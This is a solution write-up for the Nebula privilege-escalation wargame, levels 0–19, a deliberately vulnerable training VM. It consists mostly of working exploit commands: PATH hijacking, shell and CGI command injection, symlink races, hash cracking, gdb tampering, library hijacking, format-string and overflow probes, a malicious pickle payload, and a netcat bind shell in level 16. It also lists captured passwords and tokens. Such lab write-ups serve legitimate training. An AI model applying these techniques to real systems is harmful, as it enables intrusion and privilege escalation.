
Solutions for Nebula wargame:
http://www.exploit-exercises.com/


Level 0:
--------------------------
$find / -user flag00 -type f -executable 2>/dev/null
/bin/.../flag00
$ /bin/.../flag00
Congrats, now run getflag to get your flag!
$id
uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)

next level pass: KmuHcCMN

Level 1:
--------------------------
in ~/:  
test.c:

int main(int argc, char **argv, char **envp)
{
  system("/bin/getflag");
}

level01@nebula:~$ gcc -o echo test.c
level01@nebula:~$ PATH=/home/level01 /home/flag01/flag01
You have successfully executed getflag on a target account

next level pass: HVCe3iUg

Level 2:
--------------------------
USER="levelx; cat /home/flag02/password"
/home/flag02/flag02

next level pass: ny0JJdYo


Level 3:
--------------------------
vim /home/flag03/writable.d/scr
  #!/bin/bash
  getflag > /tmp/out
  cat /home/flag03/password > /tmp/mp
chmod +x scr

next level pass: X9m6DVW1

Level 4:
--------------------------
level04@nebula:~$ ln -s /home/flag04/token /tmp/tk
level04@nebula:~$ /home/flag04/flag04 /tmp/tk
06508b5e-8909-4f38-b630-fdb148a848a2

next level pass: AzQQJxkI

Level 5:
--------------------------
tar xvf /home/flag05/.backup/backup-19072011.tgz
ssh flag05@localhost
cat /home/flag05/password

next level pass: ybu8G9D3

Level 6:
----------------
level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh

> echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > passwd
> john.exe passwd
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (flag06)

next level pass: 4BmdV8HX
  
Level 7:
----------------
vim thttpd.conf
wget -O - http://localhost:7007/index.cgi?Host=%3b%20getflag
http://nebula:7007/index.cgi?Host=%3bcat%20password
  
  or
  
$ wget http://localhost:7007/index.cgi?Host=%3b%20getflag%20%3E%20/tmp/out07
$ cat /tmp/out07

next level pass: V33ZbEoF 

Level 8:
----------------
from pcap: Password: backdoor[DEL][DEL][DEL]00Rm8[DEL]ate
==>flag08 password: backd00Rmate

next level pass: BSfL8dMg

Level 9:
----------------
/tmp/scr:
    [email {${system($filename)}}]
    cat /home/flag09/password
    echo "liviu was here" >> /home/flag09/hall_of_fame
    cat /home/flag09/hall_of_fame

chmod +x /tmp/scr

/home/flag09/flag09 /tmp/scr

next level pass: t8JzLEZl

Level 10:
----------------
Trigger race condition:
Method 1:
(In a scenario I had nebula VM, network in bridged mode, and connect() 
call times out immediately. So the first method doesn't work. GOTO Method 2)
touch /tmp/test
/home/flag10/flag10 /tmp/test localhost &
(/tmp/test is readable ==> bypass access check. Wait for connect timeout)
rm /tmp/test; ln -sf /home/flag10/password /tmp/test
(replace link and start listener)
WIN: nc -l -p 18211

Method 2:
http://www.mattandreko.com/2011/12/exploit-exercises-nebula-10.html
Start 4 terminals.

1. Infinite loop to append received output to a file
$ while :; do nc.traditional -l -p 18211 >> out.txt; done
2. Infinite loop (-f) to search for the banner in the received file
tail -f out.txt | grep -v ".oO Oo."
3. Infinite loop to replace /tmp/token10 link with a readable file and
alternatively with the token file
touch /tmp/token
while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/flag10/token /tmp/token10; done
4 Start the flag10 binary with a low priority (-n 20), in an infinite loop,
connecting to localhost
while :; do nice -n 20 /home/flag10/flag10 /tmp/token10 127.0.0.1; done

Eventually we'll get the token in the second termina:
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

next level pass: UJhv5Wds

Level 11:
----------------
/home/level11/gen.py 
Script to generate initial encoded buffer, 
to be decoded into a valid command.

level11@nebula:~$ python gen.py | TEMP=/tmp /home/flag11/flag11
level11@nebula:~$ cat /tmp/out11
You have successfully executed getflag on a target account

next level pass: 4RmWT7Dz

Level 12:
----------------
telnet 127.0.0.1 50001
Password: `getflag > /tmp/flag12` 
Command passed as password gets evaluated by popen()

next level pass: 6yXhk4cu

Level 13:
----------------
cd ~/
gdb /home/flag13/flag13
(gdb) set logging on
(gdb) disas main
Dump of assembler code for function main:
  [ . . .]   
  0x080484ed <+41>:	xor    %eax,%eax
  0x080484ef <+43>:	call   0x80483c0 <getuid@plt> // call to getuid()
  0x080484f4 <+48>:	cmp    $0x3e8,%eax  // comparison
Quit
(gdb) break *080484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) c
Continuing.
Your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 2114) exited with code 063]

next level pass: 3JNcCWvD

Level 14:
----------------
$cd /home/flag14
$./flag14 -e
Simple encrytion with incrementing key. 
abc -> ace and so on ...
'Decrypt' with dec.py:
$cd ~
$python dec.py `cat /home/flag14/token`
8457c118-887c-4e40-a5a6-33a25353165

next level pass: NeZMmlui

Level 15:
----------------
./strace /home/flag15/flag15
http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html

[...]
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
[...]
Create a fake library in the path above, where the program searches for libraries,

Function used:
gdb /home/flag15/flag15
(gdb) disas main
. . .
0x08048340 <+16>:    call   0x8048300 <puts@plt>
. . .

To get access to system()  function, link in libc’s static library (-Bstatic, -static).

level15@nebula:~$ mkdir -p /var/tmp/flag15/tls/i686/sse2/cmov
level15@nebula:~$ /home/flag15/flag15
Segmentation fault
level15@nebula:~$ cat /tmp/out15
You have successfully executed getflag on a target account
level15@nebula:~$


next level pass: 574YGIzG

Level 16:
----------------
http://thisisdearmo.blogspot.com/2012/06/nebula-level-16-solution.html
Script should be placed in /tmp folder, so that flag16 user (the owner of thttpd process) can access it.
/tmp/SCRIPT:
#!/bin/sh
nc.traditional -l -p 4444 -e /bin/sh

nc nebula 1616
GET /index.cgi?username="`/*/SCRIPT`%00"&password=pass

>nc 192.168.0.18 4444
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
getflag
You have successfully executed getflag on a target account

next level pass: 

Level 17
---------------------------
http://nadiana.com/python-pickle-insecure
http://docs.python.org/library/pickle.html
"Warning The pickle module is not intended to be secure against erroneous or 
maliciously constructed data. Never unpickle data received from an untrusted 
or unauthenticated source."

Method1:
$ touch ~/pickled
cos
system
(S'getflag > /tmp/out2'
tR.

$ cat pickled | nc localhost 10007
Accepted connection from 127.0.0.1:53001
^C
level17@nebula:~$ cat /tmp/out2
You have successfully executed getflag on a target account

Method2:
Create an object that, when unpickled, will run a specified command, 
in it's __reduce__() function. Then print its pickled representation and feed 
it to the script running on 10007.
(more on this: http://blog.nelhage.com/2011/03/exploiting-pickle/)

python exploit.py  | nc 127.0.0.1 10007
Accepted connection from 127.0.0.1:53002
^C
level17@nebula:~$ cat /tmp/out_exp
You have successfully executed getflag on a target account

next level pass: 

Level 18
---------------------------
(http://vnico.mundodisco.net/archives/36)
Misc notes:
- The account is locked (! mark in the shadow file), so even if we obtain 
the token we won't be able to log in.
- fgets considers the line terminator as a valid character. New lines are 
stripped after each command line input, but not after reading from 
password file ==> cannot match, even if we know the password.
- print errno after a system call
 (gdb) p errno
> Cannot find thread-local variables on this target
Workaround:
(gdb) p *((int *(*) (void)) __errno_location) ()
$5 = 13
EFAULT
pathname points outside your accessible address space.

- set value of an address :
(gdb) set {int}0x804b0b4 = 1


Method 1:
ulimit -a 
[. . .]
open files                      (-n) 1024
$ for i in {0..1030}; do echo "login test" >> /tmp/input; done
$ echo "closelog" >> /tmp/input
$ echo "shell" >> /tmp/input
$ echo "/bin/getflag" > /tmp/Starting
$ chmod +x /tmp/Starting
$ PATH=/tmp:$PATH cat /tmp/input |/home/flag18/flag18 --init-file -d /tmp/debuglog

Method 2:
level18.c: In function ânotsupportedâ:
level18.c:46:2: warning: format not a string literal and no format arguments [-Wformat-security]

(Reference to SITE EXEC format string vulnerability in WU-FTPD 2.6.0)
[1] Hacking - The Art of Exploitation 2nd edition - Jon Erickson

$ /home/flag18/flag18 -d deb -vvv
site exec %s%s%s%s%s%s%s%s%s%s%s%s
Segmentation fault

Detailed steps in fmt_exploit_session.txt file.

Method3
Bypass fortify protection for buffer overflow at setuser command

$ echo setuser `perl -e 'print "A"x200'` | /home/flag18/flag18
*** buffer overflow detected ***: /home/flag18/flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6ff8d5]
   
next level pass:

Level 19
---------------------------
http://chrismeyers.org/2012/05/01/nebula-level-19/

http://en.wikipedia.org/wiki/Orphan_process
An orphan process is a computer process whose parent process has finished or terminated, though it remains running itself.
In a Unix-like operating system any orphaned process will be immediately adopted by the special init system process. This operation is called re-parenting and occurs automatically.

ps aux | grep -i init
root         1  0.0  0.7   3188  1772 ?        Ss   Jul13   0:03 /sbin/init

level19@nebula:~$ gcc start.c
level19@nebula:~$ ./a.out
level19@nebula:~$ cat /home/flag19/test
You have successfully executed getflag on a target account
level19@nebula:~$


--------
It shall be done.
Ghost reportin'
Jacked up and good to go
Good day, commander.